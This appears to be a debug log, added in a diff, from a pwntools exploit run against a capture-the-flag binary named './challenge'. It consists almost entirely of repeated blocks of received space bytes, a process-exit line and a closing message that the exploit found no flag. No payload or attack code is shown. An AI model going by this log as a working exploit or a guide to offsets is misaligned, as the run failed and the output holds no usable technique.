+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[*] Process './challenge' stopped with exit code 0 (pid 313)
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b' ' * 0xfff
+[DEBUG] Received 0xfff bytes:
+    b'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               c                                                                                                                                                                                                                                                                                                                                                                                                                                               '
+[DEBUG] Received 0x618 bytes:
+    00000000  20 20 20 20  20 20 20 20  20 20 20 20  20 20 20 20  │    │    │    │    │
+    *
+    00000610  20 20 20 20  20 20 8b 0a                            │    │  ··│
+    00000618
+[-] Exploit finished but no flag. Check offsets again.
